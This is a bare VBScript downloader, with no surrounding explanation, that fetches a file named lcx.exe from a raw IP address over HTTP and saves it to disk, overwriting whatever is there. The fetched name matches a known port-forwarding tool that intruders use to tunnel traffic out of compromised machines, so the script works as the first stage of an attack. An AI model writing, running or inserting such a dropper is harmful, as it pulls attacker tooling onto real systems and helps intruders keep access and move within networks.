Download "http://121.42.56.8/lcx.exe", "lcx.exe" 
Function Download(strUrl, strFile)
Set xHttp = CreateObject("MSXML2.ServerXMLHTTP")
xHttp.Open "GET", strUrl,0
xHttp.Send()
Set bStrm= CreateObject("ADODB.Stream")
with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile strFile, 2 '//overwrite
end with
End Function